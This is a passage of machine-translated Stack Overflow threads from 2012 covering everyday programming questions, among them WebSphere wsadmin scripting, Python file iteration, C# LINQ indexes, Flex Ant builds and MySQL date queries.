您只想更改控制台输出的字体吗？如果这是问题：（`Preferences > General > Appearence > Colors and Fonts > Debug > Console font`对于mac上的eclipse。其他人应该是一样的）

但是，如果您想更改控制台上出现的部分文本，恐怕没有简单的方法。

# websphere - 人性化的 WebSphere 脚本工具/库？

> ID：13572055
> 
> 赞同：10
> 
> 时间：2012-11-26T19:51:31.937
> 
> 标签：websphere, jython, wsadmin

我正在开发许多用于管理 WAS 基础架构的脚本，并且我得到的印象是 IBM 有人`wsadmin`故意搞砸了。这不可能是意外。

这是一个“简单”的例子：

```
for node in AdminConfig.list('Node').splitlines():
    nodeName = AdminConfig.showAttribute(node, 'name')
    for srv in AdminConfig.list('Server', node).splitlines():
        if AdminConfig.showAttribute(srv, 'serverType') == 'APPLICATION_SERVER':
            serverName = AdminConfig.showAttribute(srv, 'name')
            prop = AdminConfig.getid('/Node:%s/Server:%s/JavaProcessDef:/JavaVirtualMachine:/Property:java.awt.headless/' % (nodeName, serverName))
            if prop:
                AdminConfig.modify(prop, [ ['value','true'] ])
            else:
                jvm = AdminConfig.getid('/Node:%s/Server:%s/JavaProcessDef:/JavaVirtualMachine:/' % (nodeName, serverName))
                AdminConfig.create('Property', jvm, [ ['name', 'java.awt.headless'], ['value', 'true'] ], 'systemProperties') 
```

上面的脚本不仅不可维护，而且不可读。该`wsadmin`工具是只写工具！一个人写了一个脚本，第二天就无法理解它是如何工作的，甚至无法理解它的作用！

这样不是更容易吗？：

```
for node in list('Node'):
    nodeName = node.name
    for srv in node.list('Server'):
        if srv.serverType == 'APPLICATION_SERVER':
            jvm = srv.processDefinitions[0].jvmEntries[0]
            jvm.createOrModify('Property', { 'name': 'java.awt.headless' }, { 'value': 'true' }) 
```

...如果 WAS 脚本更友好，人们可以很容易地弄清楚脚本的作用，而无需花费几分钟来尝试理解繁忙的 API。更不用说易于维护了。

有没有人见过/尝试过实现更友好的管理工具（或 wsadmin 库）？

我问是因为我实际上打算开发一个友好的 Jython 库，我只是想避免重新发明轮子。

我见过很多面向任务的 Jython 库。其中一些在较新版本的 WAS 中可用，另一些已在 IBM developerWorks 上发布，一些库在 Web 上可用。对我来说，它们是另一种需要学习的 API，它们仅对有限的一组任务有用。我宁愿寻找通用的 WAS 脚本工具/库。

**编辑：**这个问题是一个更大的 WebSphere 自动化项目之前的研究的一部分。当时我询问的图书馆不存在，因此我开始开发 WDR。你可以在这里找到它：[http](http://wdr.github.io/WDR/) ://wdr.github.io/WDR/ 。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T15:56:16.747

IBM developerWorks 有一个名为`wsadminlib`. 我从 stackoverflow 上的另一个问题中发现了这一点，由 BradT 回答： [wsadmin-jython-restart-was-appserver](https://stackoverflow.com/a/13568087/1754563)。该库是由一些 IBM 开发人员创建的，他们对 wsadmin jython 语法的感受与您一样。

由于这个库只是另一个 jython 文件，您可以将其导入到您自己的脚本中，并直接调用方法。这是一个启动应用程序服务器的示例，取自[wsadminlib-blog](http://wsadminlib.blogspot.com/2010/03/how-to-use-wsadminlibpy.html)：

```
execfile('/tmp/wsadminlib.py')

servername = 'server1'
nodename = 'node1'

startServer(nodename,servername) 
```

[您可以在此处](http://www.ibm.com/developerworks/websphere/library/samples/SampleScripts.html)和[此处](http://wsadminlib.blogspot.com/)的图书馆中找到更多信息。同样，这些链接在 BradT 对上述另一个问题的回答中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T20:22:59.317

我知道的唯一工具是 Rational Automation Framework。它旨在帮助自动化许多不同中间件组件的部署、配置和管理。

[http://www-01.ibm.com/software/rational/products/framework/](http://www-01.ibm.com/software/rational/products/framework/)

我没有直接使用这个工具本身，但我的理解是你不需要编写任何脚本来管理你的服务器。您基本上可以从一个环境（开发或测试）“导出”WAS 配置并将其“导入”到另一个环境。它甚至可以保留您的配置的版本历史。

我有兴趣了解您遇到的任何其他工具。

# android - 从 LUDO 游戏的 png 图像中获取位置

> ID：13572056
> 
> 赞同：0
> 
> 时间：2012-11-26T19:51:37.660
> 
> 标签：android, android-layout, android-intent, android-emulator

你好，我正在开发一款安卓游戏，即 LUDO 游戏。我使用了四种不同的数组来获取 LUDO Board 在 Hit and trail mwthod 上的位置。

四个不同的数组如下。

```
 int[] t_LM = { 60, -44, 17, -46, 155, -44, 17, -46, -201, -44, 17, -46,
        155, -44, 17, -46 };
int[] t_TM = { 42, 63, 63, 85, 42, 63, 63, 85, 233, 254, 254, 275, 233,
        254, 254, 275 };
int[] t_o_LM = { 38, -57, -57, -57, -57, -57, 3, -27, -27, -27, -27, -27,
        3, -27, -27, -27, -27, -27, 3, 3, 3, 3, 3, 3, -27, -57, -207, 3, 3,
        3, 3, 3, -57, -27, -27, -27, -27, -27, -57, -27, -27, -27, -27,
        -27, -57, -57, -57, -57, -57, -57, -27, 3 };
int[] t_o_TM = { 200, 275, 275, 275, 275, 275, 305, 337, 369, 401, 432,
        464, 464, 464, 432, 401, 369, 337, 305, 275, 275, 275, 275, 275,
        275, 242, 209, 209, 209, 209, 209, 209, 177, 146, 115, 83, 51, 20,
        20, 20, 51, 83, 115, 146, 177, 209, 209, 209, 209, 209, 209, 242 }; 
```

LUDO板的图像如下 ![游戏的实际棋盘](../Images/a09a0336084882d60b1a80f4fbea04d0.png)

但是当我在模拟器的屏幕上获得坐标和地图时，它会显示如下..

![在此处输入图像描述](../Images/1050789055b079b0cf3fdac432feaac2.png)

图片中粉色、黄色和绿色的方框是我在Hit and trail 方法后得到的坐标。

任何有助于解决此问题的软件或链接都将受到高度赞赏。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:12:11.213

我假设你想移动它`pink, yellow and green tiles`的顶部`white squares`是 a 的一部分`background image`。

我不确定您是否可以`(belonging to white boxes)`在运行时获取图像的具体坐标。`(Please comment, if it is possible. I would love to learn)`

我的替代方案是，当您滚动 a 时，`dice`让用户触摸特定内容`white box`并在其上绘制`colored tile`。

否则，您可以绘制自己的板`programmatically`或通过`xml`并将颜色更改`white box`为`user tile`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T12:59:29.897

您可以使用纵横比来解决此问题。手动获取原始图像的尺寸，测量原始图像的一些初始位置，在运行时获取图像的尺寸，计算原始图像和屏幕图像的纵横比，并在运行时使用该比例放置碎片。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-08-10T00:19:05.200

我假设您想在 Ludo 棋盘图像上设置棋子以显示用户在整个游戏中的进度。

你这样做的方式可以通过管理纵横比并相应地放置碎片来完成，这非常困难，并且无法预测它是否真的有效。如果你想使用 naive android，请使用`15x15` 网格并相应地破坏图像。稍后使用网格位置作为彩色作品的坐标。

如果您正在寻找更简单的选项，请使用 Unity 等游戏引擎，但它可能会为您的游戏创建更大的 APK 文件。

# c# - 将数据添加到 2 个不同表单上的 2 个不同列表框

> ID：13572060
> 
> 赞同：0
> 
> 时间：2012-11-26T19:52:04.317
> 
> 标签：c#, visual-studio-2010, listbox

旅行表格，送货表格，取货表格

在主窗体上，我有一个按钮，可将您带到您将一些数据输入到文本框中的行程，然后当您按添加时，它将添加取件或交付，具体取决于您`listbox`在主窗体上输入的数据方式

我将如何获得它，以便如果我将交付添加到`listbox`主表单中，它还会将交付添加到`listbox`交付表单中的a

或者，如果我`listbox`在主表格上添加一个取件，它也会`listbox`在取件表格上添加一个取件

我如何添加交付的一些示例代码：

**主窗体添加交付按钮：**

```
 private void btnDelivery_Click(object sender, EventArgs e)
    {

        deliveryForm.deliverytrips = new DeliveryTrips();
        //New delivery- note added to the deliveryForm object

        deliveryForm.ShowDialog();
        //Show the deliveryForm. ShowDialog ensures that the form has the exclusive focus until it is closed.

        if (deliveryForm.deliverytrips != null)
        //if null then the "cancel" button was pressed
        {
            DeliveryTrips newApp = deliveryForm.deliverytrips;
            //Get the delivery object from the form

            theDelivery.addDeliveryTrip(newApp);
            //Add the delivery to the summary
        }
        updateList();
        //Update the list object to reflect the delivery in the summary 
```

**将交付添加到主窗体上的列表框的旅行代码：**

```
 public partial class frmDelivery : Form
    {
    private DeliveryTrips theDeliveryTrips;
    //The DeliveryTrips object being created/edited

    public DeliveryTrips deliverytrips
    {   //Property to allow access to theDeliveryTrips
        get { return theDeliveryTrips; }
        set { theDeliveryTrips = value; }
    }

    public frmDelivery()
    {   //Constructor
        InitializeComponent();
    }

    private void frmDelivery_Load(object sender, EventArgs e)
    {
        //When makeing the form visible, set the text boxes to reflect the values in
        //theDeliveryTrips.

        if (theDeliveryTrips != null)
        {

            txtDescription.Text = "Delivery";
            txtDescription.ReadOnly = true;
            txtCustomerName.Text = theDeliveryTrips.customername;
            txtCustomerAddress.Text = theDeliveryTrips.customeraddress;
            txtTime.Text = theDeliveryTrips.arrivaltime.ToString();

        }

    }

    private void btnAdd_Click_1(object sender, EventArgs e)
    {

        theDeliveryTrips.description = txtDescription.Text;
        theDeliveryTrips.customername = txtCustomerName.Text;
        theDeliveryTrips.customeraddress = txtCustomerAddress.Text;
        theDeliveryTrips.arrivaltime = TimeSpan.Parse(txtTime.Text);

        this.Hide();
        //Hide the forum
    }

    private void btnCancel_Click_1(object sender, EventArgs e)
    {
        theDeliveryTrips = null;
        //Set theDeliveryTrips to null as to remove any changes made

        this.Hide();
        //Hide the forum
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:25:26.417

You could create a public method in your frmDelivery class:

```
public void ListBoxAdd(string item)
{
     listbox_frmDelivery.Items.Add(item); // or whatever your list box is called
} 
```

then in your main where you initialized frmDelivery you can call:

```
deliveryForm.ListBoxAdd("Added From Main Form by pub method"); 
```

**or** you can search for it on your main form:

```
 int indexOfListBox = deliveryForm.Controls.IndexOfKey("frmDelivery listbox id");
        if (indexOfListBox != -1)// if not -1 we found it
        {
            ListBox deliveryListBox = (ListBox)deliveryForm.Controls[indexOfListBox];
            deliveryListBox.Items.Add("Added from Main form by searching index");
        } 
```

# python - Python：带有文件的for循环，如何在forloop中获取下一行？

> ID：13572062
> 
> 赞同：16
> 
> 时间：2012-11-26T19:52:17.287
> 
> 标签：python, file, for-loop

我有一个文件，我想一次获取每一行，但是一旦它到达特定的行，我需要获取接下来的几行信息。

这是一个代码示例：

```
rofile = open('foo.txt', 'r')
for line in rofile:
    print line
    if(line.strip() == 'foo'):
        line = line.next()
        print line
        line = line.next()
        print line
        line = line.next()
        print line 
```

当我第二次回来循环时，第一个打印语句应该打印文件中的第 5 行。有没有办法做到这一点？

编辑：很抱歉没有澄清细节。`rofile`是我正在迭代的文件对象。是否`next()`是使用文件时获取下一行的真正方法，我不知道。我对 python 中的文件操作没有太多经验。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-26T19:53:21.893

您可以使用`iter`将您的对象转换为支持`next`.

```
irofile = iter(rofile)
for line in irofile:
    print line
    if(line == 'foo'):
        line = next(irofile)  #BEWARE, This could raise StopIteration!
        print line 
```

正如评论中所指出的，如果您的对象已经是一个迭代器，那么您无需担心`iter`（对象就是这种情况`file`）。但是，我将它留在这里，因为它适用于任何任意可迭代（例如`list`s）的情况。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-26T20:04:59.990

根据对象的类型`rofile`，我可以想到几种方法来做到这一点。

### 字符串列表

如果您可以将其简单地视为构成文件行的字符串列表：

```
for index, line in enumerate(rofile):
   if line == 'foo':
       for a in range(index, index + HOW_MANY_LINES_YOU_WANT):
           print rofile[a] 
```

### 可迭代

如果文件已经是可迭代的：

```
for line in rofile:
    print line
    if line == 'foo':
        for a in range(3): # Just do it 3 times
            print line.next()
            # After this happens and the for loop is restarted,
            # it will print the line AFTER 
```

您可以在我写的这个快速示例中看到，它将以这种方式作为可迭代对象工作：

```
>>> k = iter([1,2,3,4])
>>> for a in k:
    print 'start loop'
    print a
    if a == 2:
        print 'in if'
        print k.next()
        print 'end if'
    print 'end loop'

start loop
1
end loop
start loop
2
in if
3
end if
end loop
start loop
4
end loop 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-26T20:07:05.760

`for`如果您实际上不想*为*每一行都做某事，请不要使用循环。一种选择可能是：

```
try:
    while True:
        line = file.next()
        #do stuff
        if line == 'foo':
            #do other stuff
except(StopIteration):
     #go on with your life 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-26T23:28:23.343

这是对文件对象执行此操作的简单方法：

```
with open('foo.txt', 'r') as rofile:
    for line in rofile:
        print line,
        if line.strip() == 'foo':
            for _ in xrange(3):  # get the next 3 lines
                try:
                    line = rofile.next()
                except StopIteration:
                    break
                print line, 
```

如果在看到 'foo' 行后没有 3 行，则需要 try/except。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-11-03T10:20:32.720

我遇到了类似的问题，并且使用该`continue`语句代替了我的情况

# eclipse - Eclipse：由于错误，该项目未构建

> ID：13572063
> 
> 赞同：3
> 
> 时间：2012-11-26T19:52:18.000
> 
> 标签：eclipse, sts-springsourcetoolsuite

每当我在 Eclipse STS 中创建新的 Spring MVC 项目时，都会收到此错误消息。

`The project was not built due to "Error deleting resource '/ProjectName/target/classes/log4j.xml' from the workspace tree." Fix the problem, then try refreshing this project and building it since it may be inconsistent.`

为什么会这样？我没有更改任何内容，并且位于`classes\log4j.xml`文件系统上的文件存在。当我尝试导入文件时，Eclipse 告诉我不能，因为源代码已经存在于项目中（即使它告诉我它已被删除）。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-11-26T20:04:35.793

这可能是因为文件/文件夹被锁定，eclipse 无法删除它。尝试重新启动 Eclipse。如果这不起作用，请手动删除文件。由于它位于类文件夹中，因此在您构建时会重新创建它。

如果一切都失败了，请尝试重新启动机器。

# ajax - for 循环中使用的 createDocumentFragment()

> ID：13572064
> 
> 赞同：0
> 
> 时间：2012-11-26T19:52:23.543
> 
> 标签：ajax, dom

**createDocumentFragment()**在下面的代码中做了什么吗 ？

我正在尝试调整此代码。我不确定它是如何工作的，并且`for`循环似乎没有调用`tableFrag`. 你的见解？

```
function createTable(searchResults)
{
    var results_table = 
        document.getElementById("report_results").getElementsByTagName("table")[0];

    var newLink, tableFrag;
    tableFrag = document.createDocumentFragment();
    tableFrag.appendChild(results_table);

    for (result_index in searchResults.results)
    {
        newRow = results_table.getElementsByTagName("tbody")[0].insertRow(-1);

        newCell = newRow.insertCell(-1);
        newCell.appendChild(document.createTextNode(searchResults.results[result_index]["score"]));

        newCell = newRow.insertCell(-1);
        newLink = document.createElement("a");
        newLink.href = 
            "officer.php?officer_seq="+searchResults.results[result_index]["officer_seq"];
        newLink.appendChild(document.createTextNode(searchResults.results[result_index]["officer_id"]));
        newCell.appendChild(newLink);

        newRow = null;
    }
    document.getElementById("report_results").appendChild(tableFrag);
} 
```

具体来说，让我感到困惑的是`tableFrag`在循环中找不到它：

```
 for (result_index in searchResults.results)
    {
        ...
        tableFrag this-or-that
        ...
    }
    document.getElementById("report_results").appendChild(tableFrag); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-30T21:29:32.597

这段代码中的文档片段的目的是暂时从 DOM 中删除表格。

1.  将表从 DOM 移动到片段
2.  对表执行操作
3.  将表格从片段移回 DOM

这种方法只对片段使用两个 DOM 操作（步骤 1 和 3）。它使我们可以跳过步骤 2 所需的所有重新流程。

每个 DOM 操作操作（例如，在 DOM 内表中添加一行）都会导致页面重排（网络浏览器重新计算并重新绘制页面）。当顺序执行多个 DOM 操作操作（例如添加多行）时，无需在每次操作后进行重排。只有在整个过程之后，页面才应该重新流动。为了实现这一点，我们必须暂时将表从 DOM 中分离出来，方法是将其移动到片段中。脱离 DOM 的元素不会导致重新流动。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-30T21:08:13.027

在我看来，该片段被用作存储 results_table 的原始 dom 的一种方式。然后 for 循环对 results_table 进行更改。完成后，片段（包含原始表）将附加到 results_table 的末尾。

它基本上是将新的搜索结果放在表格的顶部并将旧的结果移到底部，因此片段和 for 循环都可以做一些事情。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-07T21:22:23.817

是的，它正在做一些事情：性能优化。

HTML 文档中的元素保存在[树形数据结构](http://www.html5rocks.com/en/tutorials/internals/howbrowserswork/)中，您可以通过 DOM 接口（即类似`document.getElementById(id)`or的方法）访问它`document.getElementsByClassName()`。每次操作此树时，即当您通过 Javascript 代码插入、删除或修改节点时，浏览器的渲染引擎必须根据 CSS 定义的规则*重新布局*框（这也称为重*排），并在浏览器窗口上**重新绘制*树的可见部分。

在您的情况下，您必须向表中添加固定数量的行。当循环开始时，您已经知道必须向`N`表中添加行。如果你只是简单地向 DOM 元素添加行，每次调用`table.appendChild(row)`浏览器都会测量、布局和绘制页面，这种情况在大多数情况下都会发生`N`（实际上浏览器会限制这些昂贵的操作，但任何规范都不需要这样做，所以我们可以出于学习目的假设每次追加时，浏览器都会使树*无效并重新绘制）。*

所有这些处理都是不需要的：我们不希望浏览器一次明显地增加表一行，我们只是想一次性将`N`行放入表中，一种*事务*。`DocumentFragment`存在这个确切的目的：当您操作片段的子级时，浏览器不会测量和布局任何东西。这仅在您最终将片段附加到主 DOM 时才会发生。在我们想象的和简化的浏览器中，绘制例程只被调用一次，而不是`N`多次。

因此，您的脚本所做的是创建一个片段，从主 DOM 中删除表格，将节点添加到片段中，在表格附加到片段时对其进行操作，最后将整个片段添加回主 DOM，当孩子们最后测量、布置和涂漆。请注意，代码并没有明确地从 DOM 中删除表，但是`Node.appendChild(node)`当子节点已经属于某个层次结构时，这是该方法所做的：

> 将一个节点添加到指定父节点的子节点列表的末尾。如果节点已经存在，则将其从当前父节点中删除，然后添加到新的父节点。

`DocumentFragment`您可以在[MDN](https://developer.mozilla.org/en-US/docs/DOM/document.createDocumentFragment)上阅读更多信息。

# php - 带有客户名称和实际日期的 file_put_contents

> ID：13572066
> 
> 赞同：-1
> 
> 时间：2012-11-26T19:52:42.160
> 
> 标签：php

我想根据客户端和实际日期使用不同的名称保存在我的服务器内部生成的 pdf。

```
$pdf = $dompdf->output();
file_put_contents("pedidos/saved.pdf", $pdf); 
```

实际上正在工作，但不是使用**saved.pdf**作为文件名，我希望它是客户的名称和实际日期。例如**cocacola26-11-2012.pdf** 我在**$nombrecliente**中有客户的名称。我曾尝试以多种方式做到这一点，但没有成功。谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T19:58:06.113

```
date_default_timezone_set('UTC');
$pdf = $dompdf->output();
file_put_contents('pedidos/' . $nombrecliente . date('m-d-Y'). '.pdf', $pdf); 
```

# .net - 从共享文件夹运行 Windows 应用程序

> ID：13572067
> 
> 赞同：3
> 
> 时间：2012-11-26T19:52:42.727
> 
> 标签：.net, visual-studio-2010, ms-access

我需要使用 Visual Studio 2010 开发一个简单的 Windows 应用程序，并使用一个 MS Access 关系数据库，该数据库将在我们网络中的公共共享文件夹上访问。

我们无法在我们的服务器上创建和托管 Web 应用程序。

在我们开发应用程序并创建我们的 exe 文件后，多个用户可以从共享文件夹中运行同一个 exe 文件并同时生成报告吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T20:11:51.897

多个用户可以同时执行该文件（通常执行是只读的）。唯一的问题是当您想要修改共享文件夹中的任何文件时（例如写入日志文件或发布新版本时）

任意数量的进程（在相同或不同的机器上）都可以以只读方式访问文件。但是，一旦他们掌握了文件的句柄，就无法对其进行修改。这意味着在发布新版本时，必须停止所有正在运行的副本。如果多个实例想要写入同一个日志文件，您必须实现某种形式的排队机制/处理正在由另一个进程写入的日志文件并且无法获得写入句柄。

值得注意的是，当用户过多时访问不稳定*。*如果我记得 12 是我听到的推荐的最大并发用户数，尽管[它似乎因使用情况而异](https://stackoverflow.com/q/5646793/156755)。

# javascript - 使用 javascript 在 Chrome && Firefox 中获取元素的真实高度

> ID：13572070
> 
> 赞同：0
> 
> 时间：2012-11-26T19:52:53.740
> 
> 标签：javascript, cross-browser, height, dimensions, offsetheight

我有一个充满嵌套 Div 类的页面，我想获得外部 div 的真实高度。OffsetHeight 在 IE(!) 中有效，但在 FireFox 和 Chrome 中无效。

任何人都知道在什么情况下 offsetHeight 可能会返回错误的值？

我的页面太大太复杂，无法在此处发布。我试图创建一个简单的代码来模拟这种情况，但它（offsetHeight）在测试代码（：（）中工作。

当 div 的内容高度大于 div 的高度时，OffsetHeight 返回错误（或者可能出乎我的意料）。那是另一个问题。

顺便说一句，Jquery 返回与 offsetHeight 相同的值。

# c# - 获取数组索引的优雅方式

> ID：13572076
> 
> 赞同：1
> 
> 时间：2012-11-26T19:53:11.787
> 
> 标签：c#, linq, for-loop

我很难通过以下示例切换到 LINQ：

```
int[] inputs = { 5, 3, 5, 66, 4, 5 };
int[] indexes; // I want to have the indexes of '5's in 
               // the inputs array, which is { 0, 2, 5 }

// My way (traditional for loop)

List<int> indexesList = new List<int>();
for (int i = 0; i < inputs.Length; i++)
    if (inputs[i] == 5)
        indexesList.Add(i);

indexes = indexesList.ToArray();

// LINQ way

var indexes = inputs.Select((s, i) => new { i, s })
                    .Where(t => t.s == 5)
                    .Select(t => t.i).ToArray(); 
```

**问题 1.**在**效率**（速度、内存使用）方面，如果我将代码转换为 LINQ，我会有什么优势吗？

**问题 2.**如果属实，是否有更**优雅**的方式来使用 LINQ？

PS：注意，这个方法在我的实际项目中调用非常频繁。因此，在速度或内存使用方面稍有改进将对整个过程有很大帮​​助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T19:56:18.427

如果您使用 LINQ 代码，您肯定*不会*获得*性能优势。*只需阅读它就可以看出这一点：为了将每个值与其索引相关联，创建了一个新对象：

```
(s, i) => new { i, s } 
```

这些匿名对象只是将索引与价值粘合在一起的容器。因此，与直接保持计数器相比，所有相关的内存管理都是纯粹的开销。

有人可能会说 LINQ 提供了*可读性*优势，因为大多数时候*它强调的是意图而不是机制*，但在这种特殊情况下，我认为它并不比平淡无奇的解决方案更好。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T19:59:04.443

如果您想以 LINQ 方式执行此操作，我建议您实现自己的扩展方法来返回与谓词匹配的元素的索引。

```
public static IEnumerable<int> IndexesWhere<TSource>(
    this IEnumerable<TSource> source, 
    Func<TSource, bool> predicate)
{
    int i = 0;

    foreach (TSource element in source)
    {
        if (predicate(element))
            yield return i;

        i++;
    }
} 
```

然后你可以这样称呼它：

```
var indexes = inputs.IndexesWhere(s => s == 5); 
```

使用这种方法的优点是：

1.  您避免创建匿名类型的实例（与`Select((s, i) => new { i, s })`方法不同）。
2.  该序列可以按需枚举，这意味着如果您只想执行类似`indexes.Take(2)`.

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-26T20:15:00.160

这是一种使用 LINQ 并避免创建匿名对象的方法。

```
var indexes = Enumerable.Range(0, inputs.Length)
                        .Where(x => inputs[x] == 5)
                        .ToArray(); 
```

它的性能可能类似于使用 for 循环，但您必须对其进行测试才能确定。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-26T19:57:09.767

我会说那里的 linq 方式实际上效率较低，因为您首先将结构转换为元组集合，然后选择索引。

尽管它可能看起来更优雅，但我也想说理解那里到底发生了什么有点困难。

我个人只是推荐迭代。

如果您真的需要提高效率，如果可行的话，我建议您对输入进行排序。第一次对它们进行排序时，需要一些时间，但如果您多次搜索同一个列表，它会收回成本。

# ios - 寻找 iOS 风格的快进和快退按钮图像

> ID：13572079
> 
> 赞同：0
> 
> 时间：2012-11-26T19:53:14.220
> 
> 标签：ios, uiview, uibutton, avaudioplayer, uitabbar

我正在构建一个可以播放音乐并且需要一点帮助的应用程序。我了解如何明智地实现所有编程，但是，我一直未能成功找到快进和倒带图像。这些图像将用于 UIView 上的 UIButtons。任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T19:56:00.377

请检查此应用程序：

[https://github.com/0xced/UIKit-Artwork-Extractor](https://github.com/0xced/UIKit-Artwork-Extractor)

我想你会发现它非常宝贵。哦，它也解决了你当前的问题。

# dom - 0x80070005 - 尝试访问 iframe DOM 元素时拒绝访问

> ID：13572080
> 
> 赞同：0
> 
> 时间：2012-11-26T19:53:15.043
> 
> 标签：dom, com, autohotkey

当我尝试访问 iframe 元素的 contentWindow.document 时，出现错误，`0x80070005 - Access is denied.`.

是否无法访问 iframe 文档的元素？

**文件：**

*   iframe.html
*   iframe_test.ahk

**iframe.html**

```
<html>
    <head></head>
    <body>
        <iframe width="100%" height="100%" name="myframe" src="http://www.w3schools.com"></iframe>
    </body>
</html> 
```

**iframe_test.ahk**

```
Gui, New, Resize MaximizeBox
Gui, Add, ActiveX, vWB w780 h580, % A_ScriptDir "\iframe.html" 
Gui, show, w800 h600
Loop
   Sleep 10
Until (WB.readyState=4 && WB.document.readyState="complete" && !WB.busy)        
msgbox % WB.document.All["myframe"].contentwindow.document.documentElement.innerHTML 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-09-09T21:04:10.433

通常这些错误是由于同源策略而发生的。

您通常最好依靠类似的东西[`Window.postMessage()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)或编写用户脚本来绕过同源策略。

# flash - 当类使用 Ant 时，仅包括 Flash Player 类而不是库项目中的 AIR

> ID：13572082
> 
> 赞同：0
> 
> 时间：2012-11-26T19:53:26.720
> 
> 标签：flash, apache-flex, air, flash-builder, flex4.6

我有一个通用的库项目（支持浏览器、移动和桌面配置文件）和一个在浏览器中运行并依赖于该库的 Flex 项目。当我从 Flash Builder 中调试或创建主应用程序的版本时，它在浏览器中运行良好。但是当我从我的 Ant 任务创建 SWF 时，我在运行时遇到了多个错误：

错误：

```
VerifyError: Error #1014: Class flash.data::SQLConnection could not be found. 
```

错误：

```
ReferenceError: Error #1065: Variable _class_embed_css_Assets_swf_1175738391_mx_skins_cursor_BusyCursor_347371275 is not defined. 
```

错误：

```
ReferenceError: Error #1065: Variable _class_embed_css_Assets_swf_1175738391_cursorStretch_1614050290 is not defined. 
```

错误：

```
ReferenceError: Error #1065: Variable ImageButtonSkin__embed_mxml_Assets_swf___brokenImage_1468354307 is not defined. 
```

这是我的 ANT 任务：

```
<!-- Build and output the Application.swf -->
<target name="Compile Flex" >

    <mxmlc file="${PROJECT_MXML_APPLICATION}" output="${PROJECT_OUTPUT_SWF}">

        <include-libraries dir="${FCLIB_BIN}" append="true">
            <include name="FcLibrary.swc" />
        </include-libraries>

    </mxmlc>
</target> 
```

似乎 AIR 类正在编译到 SWF 中。看起来 defaults.css 可能会被 FcLibrary defaults.css 覆盖。我也不确定如何解决。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T17:20:34.533

1.  `include-library`是使用错误的标签。它的确切含义是“将整个库，无论那里有什么，无论它是否在我的代码中引用到生成的 SWF 中。因此，尝试将其更改为`<library-path dir="/where/is/your/library/">`, with child nodes `<include name="my.swc"/>`。

2.  首先为两个运行时编译 FcLibrary.swc 是个坏主意。只需为任何一个单独构建。还要检查你没有在那里嵌入任何外来代码。例如，外国我指的是 Flex 框架代码。您可能希望从最终构建中引用该代码。

3.  除非您之前编译过 SDK 并且您知道自己在做什么，**否则不要**针对 SDK 源代码进行编译。这在时间上都很糟糕，而且它确实使编译过程复杂化。例如，一些源依赖于 PBJ 编译器的存在，另一些则假定某些目录具有资产，或者某些路径包含库或语言环境或其他一些设置，您第一次很可能会出错。

4.  您评论中的错误无关紧要，但这就是它的意思：您已使用 编译`static-link-runtime-shared-libraries="false"`，也就是说，您已指示编译器生成代码，该代码从它认为它们所在的位置加载 RSL。这通常是一件好事在处理使用 Flex 框架的项目时要这样做，因为它可以处理框架库的多次加载，并且可以为您的应用程序节省一些缓存。但是，问题是您没有授予 Flash 播放器访问错误消息中提到的目录的权限。默认情况下，限制在用于访问网络的 SWF 中加载本地文件。要启用它，请访问[http://www.macromedia.com/support/documentation/en/flashplayer/help/settings_manager04.html](http://www.macromedia.com/support/documentation/en/flashplayer/help/settings_manager04.html)并将您的目录添加到允许列表中。通常，您的开发环境会为您执行此操作（您实际上可以在本地执行此操作，也无需访问 Internet），但第一种方法更简单。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T22:24:12.790

我通过引用源路径而不是包含 SWC 解决了这个问题。

```
<target name="Compile Flex" >

    <mxmlc file="${PROJECT_MXML_APPLICATION}" output="${PROJECT_OUTPUT_SWF}">

        <source-path path-element="${FCLIB_SRC}"/>

    </mxmlc>
</target> 
```

FCLIB_SRC 类似于“/Users/user/Documents/Workspace/FCLibrary/src”。

# mysql - 使用 MySQL 获取 CURDATE() 和前一天的位置

> ID：13572083
> 
> 赞同：17
> 
> 时间：2012-11-26T19:53:39.940
> 
> 标签：mysql

```
offers.date = CURDATE() 
```

我目前拥有的。

它抢了今天的报价，但我也想抢昨天的订单。

如果不指定昨天的日期，我该怎么做？

* * *

## 回答 #1

> 赞同：47
> 
> 时间：2012-11-26T19:55:46.950

要使用 CURDATE 减去或加上一个间隔（例如昨天），您可以使用[DATE_ADD](http://dev.mysql.com/doc/refman/5.5/en/date-and-time-functions.html#function_date-add)函数

```
SELECT DATE_ADD(CURDATE(), INTERVAL -1 DAY); 
```

因此，在您的情况下，您可以像这样使用它：

```
WHERE offers.date = CURDATE() OR offers.date = DATE_ADD(CURDATE(), INTERVAL -1 DAY) 
```

或者，您还可以使用 DATE_SUB() 函数，而不是使用负间隔，而是使用相同的间隔但为正。

因此，`DATE_ADD(CURDATE(), INTERVAL -1 DAY)`将成为`DATE_SUB(CURDATE(), INTERVAL 1 DAY)`

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2014-07-01T14:50:13.327

在我看来，只说以下内容会更简单

```
